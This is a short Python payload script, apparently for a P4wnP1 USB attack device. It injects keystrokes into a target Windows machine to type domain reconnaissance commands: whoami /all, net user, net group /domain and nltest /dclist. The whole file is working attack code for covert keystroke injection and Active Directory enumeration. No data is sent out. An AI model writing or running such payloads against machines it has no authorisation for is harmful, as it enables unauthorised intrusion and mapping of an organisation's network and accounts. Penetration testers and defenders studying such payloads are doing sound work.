# File: /opt/p4wnp1/payloads/hid/domain_enum_hid.py
from tools import hid_type

print("[*] Injecting PowerShell domain enumeration commands")
cmds = [
    "whoami /all",
    "net user",
    "net group /domain",
    "nltest /dclist:"
]

for cmd in cmds:
    hid_type.type_string(cmd)
